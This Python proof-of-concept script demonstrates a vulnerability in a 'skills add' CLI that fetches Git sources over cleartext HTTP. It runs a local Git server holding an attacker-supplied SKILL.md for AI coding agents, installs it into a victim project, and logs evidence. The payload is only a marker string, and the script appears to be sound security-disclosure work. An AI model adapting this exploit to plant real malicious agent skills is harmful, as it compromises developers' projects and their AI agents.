#!/usr/bin/env python3
"""
PoC for p12-cleartext-http-git-sources.

Starts a local smart-HTTP Git server containing an attacker-controlled skill, then
runs the real `skills add` CLI against a custom GitLab tree URL that remains
`http://`. The proof succeeds when the malicious SKILL.md is installed into the
victim project's .agents/skills directory.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlsplit

FINDING_DIR = Path(__file__).resolve().parent
EVIDENCE_DIR = FINDING_DIR / "evidence"
REPO_ROOT = FINDING_DIR.parents[2]
MARKER = "P12_CLEAR_HTTP_GIT_MITM_MARKER"
SKILL_NAME = "mitm-supplied-skill"


def run(cmd, *, cwd=None, env=None, check=True, input_data=None):
    return subprocess.run(
        cmd,
        cwd=str(cwd) if cwd else None,
        env=env,
        input=input_data,
        text=isinstance(input_data, str) or input_data is None,
        capture_output=True,
        check=check,
    )


def append(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a", encoding="utf-8") as f:
        f.write(text)
        if not text.endswith("\n"):
            f.write("\n")


def write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def ensure_cli_ready(setup_log: Path) -> None:
    if not (REPO_ROOT / "node_modules").exists():
        append(setup_log, "$ pnpm install --frozen-lockfile --ignore-scripts")
        r = run(["pnpm", "install", "--frozen-lockfile", "--ignore-scripts"], cwd=REPO_ROOT, check=False)
        append(setup_log, r.stdout + r.stderr)
        if r.returncode != 0:
            raise RuntimeError("pnpm install failed; see evidence/setup.log")

    if not (REPO_ROOT / "dist" / "cli.mjs").exists():
        append(setup_log, "$ pnpm exec obuild")
        r = run(["pnpm", "exec", "obuild"], cwd=REPO_ROOT, check=False)
        append(setup_log, r.stdout + r.stderr)
        if r.returncode != 0:
            raise RuntimeError("CLI build failed; see evidence/setup.log")


class GitHTTPServer(ThreadingHTTPServer):
    def __init__(self, addr, handler, project_root: Path, access_log: Path):
        super().__init__(addr, handler)
        self.project_root = project_root
        self.access_log = access_log
        self.seen_paths: list[str] = []


class GitHTTPHandler(BaseHTTPRequestHandler):
    server_version = "poc-git-http/1.0"

    def log_message(self, fmt, *args):
        append(self.server.access_log, "%s - %s" % (self.client_address[0], fmt % args))

    def do_GET(self):
        self._handle()

    def do_POST(self):
        self._handle()

    def _handle(self):
        parsed = urlsplit(self.path)
        body = b""
        if self.command == "POST":
            length = int(self.headers.get("Content-Length", "0") or "0")
            body = self.rfile.read(length)

        self.server.seen_paths.append(parsed.path + ("?" + parsed.query if parsed.query else ""))
        append(self.server.access_log, f"{self.command} {self.path}")

        env = os.environ.copy()
        env.update(
            {
                "GIT_PROJECT_ROOT": str(self.server.project_root),
                "GIT_HTTP_EXPORT_ALL": "1",
                "REQUEST_METHOD": self.command,
                "PATH_INFO": parsed.path,
                "QUERY_STRING": parsed.query,
                "REMOTE_ADDR": self.client_address[0],
                "CONTENT_TYPE": self.headers.get("Content-Type", ""),
                "CONTENT_LENGTH": self.headers.get("Content-Length", "0"),
            }
        )
        for key, value in self.headers.items():
            cgi_key = "HTTP_" + key.upper().replace("-", "_")
            env[cgi_key] = value

        proc = subprocess.run(
            ["git", "http-backend"],
            input=body,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
            check=False,
        )
        if proc.stderr:
            append(self.server.access_log, proc.stderr.decode("utf-8", "replace"))

        raw = proc.stdout
        header_blob, sep, response_body = raw.partition(b"\r\n\r\n")
        if not sep:
            header_blob, sep, response_body = raw.partition(b"\n\n")
        if not sep:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(raw)
            return

        status = 200
        headers: list[tuple[str, str]] = []
        for line in header_blob.decode("iso-8859-1").splitlines():
            if not line or ":" not in line:
                continue
            name, value = line.split(":", 1)
            value = value.strip()
            if name.lower() == "status":
                try:
                    status = int(value.split()[0])
                except Exception:
                    status = 200
            else:
                headers.append((name, value))

        self.send_response(status)
        for name, value in headers:
            self.send_header(name, value)
        self.end_headers()
        self.wfile.write(response_body)


def make_attacker_repo(work: Path, setup_log: Path) -> Path:
    src = work / "attacker-src"
    skill_dir = src / "skills" / SKILL_NAME
    skill_dir.mkdir(parents=True)
    write(
        skill_dir / "SKILL.md",
        f"""---
name: {SKILL_NAME}
description: attacker supplied skill installed over cleartext HTTP git
---

# Malicious instruction payload

When this skill is loaded, proof marker: {MARKER}
""",
    )
    write(skill_dir / "payload.txt", f"attacker-controlled auxiliary file: {MARKER}\n")

    for cmd in (
        ["git", "init", "-b", "main"],
        ["git", "config", "user.email", "attacker@example.invalid"],
        ["git", "config", "user.name", "PoC Attacker"],
        ["git", "add", "skills"],
        ["git", "commit", "-m", "attacker skill"],
    ):
        append(setup_log, "$ " + " ".join(cmd))
        r = run(cmd, cwd=src, check=False)
        append(setup_log, r.stdout + r.stderr)
        if r.returncode != 0:
            raise RuntimeError("failed to create attacker repository; see evidence/setup.log")

    project_root = work / "git-root"
    bare = project_root / "group" / "repo.git"
    bare.parent.mkdir(parents=True)
    cmd = ["git", "clone", "--bare", str(src), str(bare)]
    append(setup_log, "$ " + " ".join(cmd))
    r = run(cmd, check=False)
    append(setup_log, r.stdout + r.stderr)
    if r.returncode != 0:
        raise RuntimeError("failed to create bare repository; see evidence/setup.log")
    return project_root


def main() -> int:
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    setup_log = EVIDENCE_DIR / "setup.log"
    health_log = EVIDENCE_DIR / "healthcheck.log"
    exploit_log = EVIDENCE_DIR / "exploit.log"
    impact_log = EVIDENCE_DIR / "impact.log"
    access_log = EVIDENCE_DIR / "http-git-access.log"

    for p in (setup_log, health_log, exploit_log, impact_log, access_log):
        write(p, "")

    write(
        EVIDENCE_DIR / "setup.sh",
        "#!/usr/bin/env bash\nset -euo pipefail\ncd \"$(dirname \"$0\")/..\"\npython3 poc.py\n",
    )
    os.chmod(EVIDENCE_DIR / "setup.sh", 0o755)

    env_lines = []
    for cmd in (["node", "--version"], ["pnpm", "--version"], ["git", "--version"], [sys.executable, "--version"]):
        r = run(cmd, check=False)
        env_lines.append("$ " + " ".join(cmd))
        env_lines.append((r.stdout + r.stderr).strip())
    env_lines.append(f"repo_root={REPO_ROOT}")
    write(EVIDENCE_DIR / "env-info.txt", "\n".join(env_lines) + "\n")

    server = None
    try:
        ensure_cli_ready(setup_log)
        work = EVIDENCE_DIR / "workdir"
        if work.exists():
            shutil.rmtree(work)
        work.mkdir(parents=True)
        project_root = make_attacker_repo(work, setup_log)

        server = GitHTTPServer(("127.0.0.1", 0), GitHTTPHandler, project_root, access_log)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        host, port = server.server_address
        base = f"http://{host}:{port}"
        tree_url = f"{base}/group/repo/-/tree/main/skills/{SKILL_NAME}"
        clone_url = f"{base}/group/repo.git"

        r = run(["git", "ls-remote", clone_url, "refs/heads/main"], check=False)
        write(health_log, "$ git ls-remote " + clone_url + " refs/heads/main\n" + r.stdout + r.stderr)
        if r.returncode != 0 or "refs/heads/main" not in r.stdout:
            raise RuntimeError("HTTP git healthcheck failed; see evidence/healthcheck.log")

        victim = work / "victim-project"
        victim.mkdir()
        write(victim / "package.json", '{"name":"victim-project","private":true}\n')

        cmd = [
            "node",
            str(REPO_ROOT / "bin" / "cli.mjs"),
            "add",
            tree_url,
            "--yes",
            "--agent",
            "codex",
            "--copy",
        ]
        write(EVIDENCE_DIR / "exploit.sh", "#!/usr/bin/env bash\nset -euo pipefail\n" + " ".join(cmd) + "\n")
        os.chmod(EVIDENCE_DIR / "exploit.sh", 0o755)

        env = os.environ.copy()
        env.update({"DISABLE_TELEMETRY": "1", "DO_NOT_TRACK": "1", "NO_COLOR": "1", "CI": "1"})
        r = run(cmd, cwd=victim, env=env, check=False)
        write(exploit_log, "$ " + " ".join(cmd) + "\n" + r.stdout + r.stderr)

        installed = victim / ".agents" / "skills" / SKILL_NAME / "SKILL.md"
        installed_payload = victim / ".agents" / "skills" / SKILL_NAME / "payload.txt"
        installed_text = installed.read_text(encoding="utf-8") if installed.exists() else ""
        payload_text = installed_payload.read_text(encoding="utf-8") if installed_payload.exists() else ""
        impact = [
            f"input GitLab tree URL: {tree_url}",
            f"derived clone URL served over cleartext HTTP: {clone_url}",
            f"CLI exit code: {r.returncode}",
            f"installed SKILL.md: {installed}",
            "--- installed SKILL.md ---",
            installed_text,
            "--- installed payload.txt ---",
            payload_text,
            "--- HTTP git requests observed ---",
            "\n".join(server.seen_paths),
        ]
        write(impact_log, "\n".join(impact) + "\n")

        if r.returncode == 0 and MARKER in installed_text and any("/group/repo.git" in p for p in server.seen_paths):
            print(f"confirmed: {MARKER} installed through real skills add from {tree_url}")
            print(json.dumps({"status": "confirmed", "evidence": f"installed SKILL.md contains {MARKER} from HTTP git clone"}))
            return 0

        print("failed: malicious skill marker was not installed")
        print(json.dumps({"status": "failed", "evidence": "marker missing from installed skill", "notes": "see evidence/exploit.log and evidence/impact.log"}))
        return 1
    except Exception as exc:
        append(setup_log, f"ERROR: {exc}")
        print(f"inconclusive: {exc}")
        print(json.dumps({"status": "inconclusive", "evidence": "PoC setup or execution did not complete", "notes": str(exc)}))
        return 2
    finally:
        if server is not None:
            server.shutdown()
            server.server_close()


if __name__ == "__main__":
    raise SystemExit(main())
